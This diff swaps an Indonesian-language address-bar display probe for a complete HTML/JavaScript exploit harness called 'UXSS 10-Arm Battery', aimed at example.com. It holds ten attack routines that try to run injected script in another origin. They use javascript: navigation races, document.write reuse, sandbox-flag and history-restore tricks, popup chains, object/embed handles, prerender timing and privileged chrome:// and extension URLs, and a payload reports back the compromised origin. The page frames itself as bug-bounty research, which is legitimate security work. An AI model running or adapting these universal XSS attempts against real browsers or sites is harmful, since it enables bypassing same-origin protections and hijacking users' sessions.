@@ -1,29 +1,134 @@
-<!-- 18 | ⭐⭐ macOS/Safari · bar HANYA menampilkan DOMAIN — panen konsekuensinya | [NO-CLICK]
-     FAKTA PENENTU  Safari default TIDAK menampilkan skema, path, query, maupun fragment.
-     Yang terlihat cuma label domain. (Settings > Advanced > "Show full website address" = mati.)
-     Konsekuensinya berlawanan arah, dan keduanya penting:
-       MATI      seluruh keluarga "path menyamar jadi host" tak terlihat -> jangan buang waktu
-       HIDUP     apa pun yang menyentuh LABEL DOMAIN jadi jauh lebih kuat, karena tidak ada
-                 skema/path/query yang tersisa untuk membantahnya. Permukaannya menyusut jadi
-                 satu string pendek - dan string pendek jauh lebih mudah dipenuhi atau dikosongkan.
-     File ini melaporkan APA yang sebenarnya terlihat, supaya kamu berhenti menebak.
-     EXPECTED-SECURE  eTLD+1 selalu terbaca utuh, apa pun panjang & isi subdomainnya. -->
-<pre id=g style="font:12px/1.7 monospace"></pre>
-<h2 style="font:19px system-ui">Lihat address bar. Berapa banyak yang benar-benar tertulis?</h2>
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<title>UXSS 10-Arm Battery — example.com</title>
+<style>
+ body{font:13px/1.6 ui-monospace,monospace;background:#0b0e14;color:#cdd9e5;padding:18px}
+ table{border-collapse:collapse;width:100%;max-width:1100px;margin-top:12px}
+ th,td{border:1px solid #2a3240;padding:5px 8px;vertical-align:top}th{background:#151b24}
+ .vuln{color:#ff6b63;font-weight:700}.echo{color:#d29922}.blk{color:#8b949e}.ok{color:#3fb950}
+ button{background:#1f6feb;color:#fff;border:0;padding:5px 10px;border-radius:5px;cursor:pointer}
+ #sink{position:absolute;left:-9999px;width:1px;height:1px}#ban{margin:8px 0;font-size:15px}
+</style>
+</head>
+<body>
+<h3>UXSS 10-Arm Battery <small>target: https://example.com</small></h3>
+<button id="all">RUN semua 0-click</button> <span id="ban"></span>
+<div id="tb"></div><div id="sink"></div>
 <script>
-var ua = navigator.userAgent;
-var safari = /Safari/.test(ua) && !/Chrome|Chromium|Edg|OPR/.test(ua);
-var arc = /Arc\//.test(ua);
-g.textContent =
-  'REAL ORIGIN   : ' + location.href +
-  '\nhost          : ' + location.host +
-  '\npath+query    : ' + (location.pathname + location.search + location.hash) +
-  '\nmesin         : ' + (safari ? 'Safari/WebKit' : arc ? 'Arc' : /Chrome/.test(ua) ? 'Chromium-based' : 'lain') +
-  '\nplatform      : ' + navigator.platform +
-  '\n\nCATAT DENGAN MATA, tiga hal:' +
-  '\n  1. address bar menulis "' + location.host + '" saja, atau URL penuh?' +
-  '\n  2. skema (https / gembok) terlihat?' +
-  '\n  3. path "' + location.pathname + '" terlihat?' +
-  '\n\nKalau jawabannya domain-saja: permukaan yang harus diserang tinggal SATU string pendek.' +
-  '\nItu menyempitkan seluruh riset ini ke file 19-23.';
+const T='https://example.com/';
+const PAY=id=>`(window.opener||window.parent||window).postMessage('UXSS|${id}|'+location.origin,'*');alert('UXSS[${id}] @ '+document.domain);`;
+const JS =id=>'javascript:'+PAY(id);
+const tick=()=>new Promise(r=>setTimeout(r,0)), sleep=m=>new Promise(r=>setTimeout(r,m));
+const add=s=>{const f=document.createElement('iframe');f.width=f.height=1;if(s)f.src=s;sink.appendChild(f);return f};
+const load=f=>new Promise(r=>{f.onload=()=>r(f);setTimeout(()=>r(f),2500)});
+const set=(id,t,c)=>{const e=document.getElementById('s'+id);if(e)e.innerHTML='<span class='+(c||'blk')+'>'+t+'</span>'};
+
+/* ---------- GERBANG ANTI-FP: hanya origin example.com yang dihitung ---------- */
+addEventListener('message',e=>{
+  const d=e.data; if(typeof d!=='string'||d.indexOf('UXSS|')!==0)return;
+  const [,id,org]=d.split('|');
+  const real=(e.origin==='https://example.com')||(org==='https://example.com');
+  set(id,real?'UXSS-CONFIRMED · '+org:'echo '+org+' (origin sendiri) = BUKAN temuan',real?'vuln':'echo');
+  if(real)ban.innerHTML='<span class="vuln">*** SOP JEBOL: kode penyerang berjalan di '+org+' — screenshot, STOP, lapor VRP ***</span>';
+});
+
+/* ---------------------------- 10 ARM ---------------------------- */
+const ARMS=[
+{id:'A1',m:'0-click',n:'initial-empty-document javascript: race',
+ w:'jendela antara frame dibuat (about:blank, mewarisi origin induk) dan commit ke example.com',
+ run:async()=>{const f=add();f.src=T;const t0=performance.now();let n=0;
+   while(performance.now()-t0<600){try{f.contentWindow.location.href=JS('A1');n++}catch(e){}
+     try{f.contentWindow.location.replace(JS('A1'))}catch(e){}await tick()}
+   return n+' tembakan js: selama commit'}},
+
+{id:'A2',m:'0-click',n:'commit-overhang document.write (document reuse)',
+ w:'objek document lama dipakai ulang oleh dokumen baru = skrip mendarat di origin tujuan',
+ run:async()=>{const f=add('about:blank');await load(f);f.src=T;const t0=performance.now();let n=0;
+   while(performance.now()-t0<600){try{f.contentDocument.write('<script>'+PAY('A2')+'<\/script>');n++}
+     catch(e){if(n)return n+' write lolos lalu '+e.name;return 'BLOCKED:'+e.name}await tick()}
+   return n+' write selama commit'}},
+
+{id:'A3',m:'0-click',n:'chain: sandbox-flag mutation + joint-history restore',
+ w:'flag sandbox/origin tidak dihitung ulang saat dokumen dipulihkan dari bfcache/history',
+ run:async()=>{const f=add();f.setAttribute('sandbox','allow-scripts allow-same-origin');f.src=T;await load(f);
+   f.setAttribute('sandbox','allow-scripts allow-same-origin allow-top-navigation allow-popups');
+   f.src=T+'?hop';await load(f);const L=history.length;history.back();await sleep(500);
+   try{f.contentWindow.eval(PAY('A3'));return 'eval() cross-origin LOLOS'}catch(e){}
+   try{const d=f.contentDocument;if(d){const s=d.createElement('script');s.text=PAY('A3');
+     (d.head||d.documentElement).appendChild(s);return 'script disuntik pasca-restore'}}catch(e){return 'BLOCKED:'+e.name}
+   return 'no-handle (histori '+L+')'}},
+
+{id:'A4',m:'1-click',n:'named-window retarget dengan javascript:',
+ w:'nama jendela dipakai sebagai target navigasi js: — initiator-check per-nama, bukan per-origin',
+ run:async()=>{const w=open(T,'vic');if(!w)return 'popup diblok';await sleep(1400);
+   let r=[];try{open(JS('A4'),'vic');r.push('open(js:,vic) terkirim')}catch(e){r.push('open:'+e.name)}
+   try{w.location=JS('A4');r.push('w.location js: terkirim')}catch(e){r.push('loc:'+e.name)}
+   return r.join(' | ')}},
+
+{id:'A5',m:'1-click',n:'anchor href=javascript: + target=frame (+<base target>)',
+ w:'navigasi js: yang diinisiasi elemen, bukan skrip — jalur parser yang berbeda',
+ run:async()=>{const f=add(T);f.name='vicf';await load(f);
+   const b=document.createElement('base');b.target='vicf';document.head.appendChild(b);
+   const a=document.createElement('a');a.href=JS('A5');a.target='vicf';a.textContent='x';
+   document.body.appendChild(a);a.click();a.remove();b.remove();return 'anchor js: diklik ke frame example.com'}},
+
+{id:'A6',m:'0-click',n:'<object>/<embed> contentDocument + getSVGDocument()',
+ w:'jalur plugin-document lama sering melewati pengecekan origin milik iframe',
+ run:async()=>{let r=[];
+   for(const tag of ['object','embed']){const o=document.createElement(tag);
+     o.setAttribute(tag==='object'?'data':'src',T);o.type='text/html';o.width=o.height=1;sink.appendChild(o);
+     await sleep(900);
+     for(const g of ['contentDocument','getSVGDocument']){try{const d=g==='contentDocument'?o.contentDocument:o.getSVGDocument();
+       if(d&&d.documentElement){const s=d.createElement('script');s.text=PAY('A6');d.documentElement.appendChild(s);
+         r.push(tag+'.'+g+' HANDLE!')}else r.push(tag+'.'+g+':null')}catch(e){r.push(tag+'.'+g+':'+e.name)}}}
+   return r.join(' | ')}},
+
+{id:'A7',m:'0-click',n:'speculation-rules prerender lalu sentuh saat aktivasi',
+ w:'dokumen ter-prerender hidup sebelum diaktifkan — pengecekan origin bisa telat',
+ run:async()=>{const s=document.createElement('script');s.type='speculationrules';
+   s.textContent=JSON.stringify({prerender:[{urls:[T]}]});document.head.appendChild(s);await sleep(1500);
+   const f=add(T);const t0=performance.now();let n=0;
+   while(performance.now()-t0<400){try{f.contentWindow.location=JS('A7');n++}catch(e){}await tick()}
+   return 'prerender diminta + '+n+' poke saat aktivasi'}},
+
+{id:'A8',m:'0-click',n:'srcdoc + <base href> + document.domain setter',
+ w:'apakah base-URL pernah dipakai untuk keputusan origin (harusnya tidak)',
+ run:async()=>{const f=add();f.srcdoc='<base href="'+T+'"><script>try{document.domain="example.com"}catch(e){};'
+   +PAY('A8')+'<\/script>';await sleep(700);return 'srcdoc base-confused dijalankan'}},
+
+{id:'A9',m:'1-click',n:'chain popup 4-lapis (js: -> data: -> about:blank write -> name)',
+ w:'satu jendela, empat cara berbeda menyuntik; catat lapisan mana yang jatuh duluan',
+ run:async()=>{const w=open(T,'_blank');if(!w)return 'popup diblok';await sleep(1200);let r=[];
+   try{w.location.href=JS('A9');r.push('L1 js: ok')}catch(e){r.push('L1:'+e.name)}
+   await sleep(300);
+   try{w.location.href='data:text/html,<script>'+encodeURIComponent(PAY('A9'))+'<\/script>';r.push('L2 data: ok')}catch(e){r.push('L2:'+e.name)}
+   await sleep(300);
+   try{w.location.href='about:blank';await sleep(200);w.document.write('<script>'+PAY('A9')+'<\/script>');r.push('L3 write ok')}catch(e){r.push('L3:'+e.name)}
+   try{w.name=PAY('A9');r.push('L4 name ditanam')}catch(e){r.push('L4:'+e.name)}
+   return r.join(' | ')}},
+
+{id:'A10',m:'0-click',n:'weird: skema internal / PDF-viewer / dokumen error',
+ w:'permukaan ber-privilege (extension & error page) yang kadang lupa isolasi',
+ run:async()=>{const urls=['chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/index.html',
+     'chrome://settings/', T+'no-such-file-'+Date.now()+'.pdf', 'view-source:'+T];
+   let r=[];for(const u of urls){const f=add();try{f.src=u}catch(e){r.push(u.slice(0,22)+':'+e.name);continue}
+     await sleep(700);
+     try{const d=f.contentDocument;if(d&&d.documentElement){const s=d.createElement('script');s.text=PAY('A10');
+       d.documentElement.appendChild(s);r.push(u.slice(0,22)+' HANDLE!')}else r.push(u.slice(0,22)+':null')}
+     catch(e){r.push(u.slice(0,22)+':'+e.name)}}
+   return r.join(' | ')}},
+];
+
+/* ---------------------------- UI ---------------------------- */
+tb.innerHTML='<table><tr><th>ID</th><th>Mode</th><th>Mekanisme</th><th>Yang diuji</th><th>Jalankan</th><th>Sinyal</th></tr>'+
+ ARMS.map(a=>`<tr><td>${a.id}</td><td>${a.m}</td><td>${a.n}</td><td>${a.w}</td>
+ <td><button data-i="${a.id}">run</button></td><td id="s${a.id}" class="blk">-</td></tr>`).join('')+'</table>';
+tb.onclick=async e=>{const i=e.target.dataset&&e.target.dataset.i;if(!i)return;
+ const a=ARMS.find(x=>x.id===i);set(i,'jalan...','blk');
+ try{const r=await a.run();setTimeout(()=>{const c=document.getElementById('s'+i);
+   if(c.textContent.indexOf('UXSS')<0)set(i,'no-signal · '+r,'blk')},2500)}catch(err){set(i,'ERR '+err.name,'blk')}};
+all.onclick=()=>ARMS.filter(a=>a.m==='0-click').forEach(a=>tb.querySelector('[data-i="'+a.id+'"]').click());
 </script>
+</body></html>
